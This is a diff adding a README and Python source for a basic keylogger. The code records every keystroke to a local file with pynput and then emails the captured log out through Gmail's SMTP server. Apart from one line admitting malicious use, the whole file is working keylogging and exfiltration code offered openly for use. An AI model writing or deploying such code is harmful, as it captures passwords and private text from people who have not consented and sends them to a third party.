@@ -1,0 +1,85 @@
+# keylogger
+# keylogger
+
+Keyloggers are programs that capture your key strokes.
+They can be used to keep logs of everything you press on the keyboard but on the 
+flip side it can be used for malicious purposes as well.
+
+The keylogger that I've made is a basic keylogger with not much functionality as the ones available in market today.
+It captures your keystrokes and saves them in a file "keylogger.txt".
+
+It then sends the contents of the file(i.e. the keystrokes) to your email id.
+
+With some extra lines of code, it can also send the keystrokes at regular intervals.
+But that is a project for another time.
+
+I have not made it executable so one has to explicitely call it.
+
+SYNTAX : python keylogger.py
+
+[NOTE: You need to press esc key to exit out the keylogger.]
+
+You need to have pynput , smtplib and ssl installed.
+
+While python comes with the library smtplib and ssl preinstalled.
+You can install pynput with :
+pip install pynput
+
+from pynput import keyboard
+import smtplib,ssl
+sender_mail = "user@domain.com"     # Replace user@domain.com with your email id (everywhere)
+#prefer using your own email id for receiver's as well.
+receiver_mail = "user@domain.com"  # Replace user@domain.com with your email id (everywhere)
+password = "passcode"              # Enter your Password here
+port = 587
+message = """From: user@domain.com
+To: user@domain.com                         
+Subject: KeyLogs
+Text: Keylogs 
+"""
+def write(text):
+    with open("keylogger.txt",'a') as f:
+        f.write(text)
+        f.close()
+
+
+def on_key_press(Key):
+    try:
+        if(Key == keyboard.Key.enter):
+            write("\n")
+        else:
+            write(Key.char)
+    except AttributeError:
+        if Key == keyboard.Key.backspace:
+            write("\nBackspace Pressed\n")
+        elif(Key == keyboard.Key.tab):
+            write("\nTab Pressed\n")
+        elif(Key == keyboard.Key.space):
+            write(" ");
+        else:
+            temp = repr(Key)+" Pressed.\n"
+            write(temp)
+            print("\n{} Pressed\n".format(Key))
+
+def on_key_release(Key):
+    #This stops the Listener/Keylogger.
+    #You can use any key you like by replacing "esc" with the key of your choice
+    if(Key == keyboard.Key.esc):
+        return False
+
+with keyboard.Listener(on_press= on_key_press,on_release= on_key_release) as listener:
+    listener.join()
+
+with open("keylogger.txt",'r') as f:
+    temp = f.read()
+    message = message + str(temp)
+    f.close()
+
+
+context = ssl.create_default_context()
+server = smtplib.SMTP('smtp.gmail.com', port)
+server.starttls()
+server.login(sender_mail,password)
+server.sendmail(sender_mail,receiver_mail,message)
+print("Email Sent to ",sender_mail)
+server.quit()
